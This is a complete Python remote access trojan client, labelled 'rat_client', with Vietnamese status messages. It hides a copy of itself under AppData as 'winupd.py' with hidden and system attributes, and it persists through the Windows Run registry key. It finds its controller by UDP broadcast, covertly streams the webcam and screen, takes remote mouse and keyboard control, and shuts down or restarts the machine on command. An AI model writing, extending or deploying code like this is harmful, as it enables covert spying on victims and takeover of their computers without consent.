import socket
import struct
import cv2
import mss
import numpy as np
import select
import time
import pyautogui
import os
import sys
import winreg
import shutil

UDP_PORT = 5005
TCP_PORT_DEFAULT = 12345

def recv_exact(sock, size):
    data = b""
    while len(data) < size:
        try:
            packet = sock.recv(size - len(data))
            if not packet:
                raise ConnectionError("Mất kết nối khi nhận dữ liệu")
            data += packet
        except socket.timeout:
            raise TimeoutError("Timeout khi nhận dữ liệu")
    return data

def copy_to_hidden_dir():
    try:
        target_dir = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "SystemData")
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
        target_file = os.path.join(target_dir, "winupd.py")
        current_file = os.path.abspath(sys.argv[0])
        if current_file != target_file:
            shutil.copy2(current_file, target_file)
            os.system(f'attrib +h +s "{target_file}"')
    except: pass

def add_to_startup():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = "rat_client"
        script_path = os.path.abspath(sys.argv[0])
        pythonw = sys.executable.replace("python.exe", "pythonw.exe")
        value = f'"{pythonw}" "{script_path}"'
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, app_name, 0, winreg.REG_SZ, value)
    except: pass

def discover_server(timeout=3):
    udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    udp.settimeout(timeout)
    try:
        udp.sendto(b"RAT_DISCOVER", ('255.255.255.255', UDP_PORT))
        data, addr = udp.recvfrom(1024)
        ip, port = data.decode().split(":")
        return ip.strip(), int(port)
    except:
        return None, None
    finally:
        udp.close()

def start_webcam_stream(client):
    cap = cv2.VideoCapture(0)
    if not cap.isOpened(): return
    try:
        while True:
            ret, frame = cap.read()
            if not ret: break
            ret, buffer = cv2.imencode('.jpg', frame)
            if not ret: continue
            data = buffer.tobytes()
            client.sendall(struct.pack(">I", len(data)))
            client.sendall(data)
            if select.select([client], [], [], 0.01)[0]:
                msg = client.recv(1024)
                if msg in [b"stop", b"exit"]:
                    break
    finally:
        cap.release()

def start_screen_stream(client):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        try:
            while True:
                img = sct.grab(monitor)
                frame = np.array(img)
                frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                ret, buffer = cv2.imencode('.jpg', frame)
                if not ret: continue
                data = buffer.tobytes()
                client.sendall(struct.pack(">I", len(data)))
                client.sendall(data)
                if select.select([client], [], [], 0.01)[0]:
                    msg = client.recv(1024)
                    if msg in [b"stop", b"exit"]:
                        break
        except: pass

def main():
    while True:
        ip, port = discover_server()
        if not ip or not port:
            time.sleep(5)
            continue
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((ip, port))
            client.settimeout(10)
            while True:
                data = client.recv(1024)
                if not data:
                    break
                command = data.decode().strip().lower()
                if command == "exit": break
                elif command == "webcam": start_webcam_stream(client)
                elif command == "screen": start_screen_stream(client)
                elif command == "mouse":
                    buffer = ""
                    while True:
                        try:
                            data = client.recv(1024).decode()
                            if not data: break
                            buffer += data
                            while "\n" in buffer:
                                line, buffer = buffer.split("\n", 1)
                                if line.startswith("mouse_move:"):
                                    x, y = map(int, line.split(":")[1].split(","))
                                    pyautogui.moveTo(x, y)
                                elif line.startswith("mouse_click:"):
                                    _, x, y, btn, state = line.split(":")[1].split(",")
                                    if state == "down":
                                        pyautogui.mouseDown(x=int(x), y=int(y), button=btn)
                                    else:
                                        pyautogui.mouseUp(x=int(x), y=int(y), button=btn)
                                elif line.startswith("mouse_scroll:"):
                                    _, x, y, dy = line.split(":")[1].split(",")
                                    pyautogui.scroll(int(dy))
                                elif line == "stop" or line == "exit":
                                    break
                        except: break
                elif command.startswith("key:"):
                    key = command.split(":", 1)[1]
                    try:
                        if "+" in key:
                            pyautogui.hotkey(*key.split("+"))
                        else:
                            pyautogui.press(key)
                        client.send(f"Đã nhấn: {key}".encode())
                    except Exception as e:
                        client.send(str(e).encode())
                elif command == "shutdown":
                    os.system("shutdown /s /t 0")
                    break
                elif command == "sleep":
                    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
                    break
                elif command == "restart":
                    os.system("shutdown /r /t 0")
                    break
                else:
                    client.send("Lệnh không xác định.".encode())
        except: pass
        finally:
            client.close()
        time.sleep(5)

if __name__ == "__main__":
    copy_to_hidden_dir()
    add_to_startup()
    main()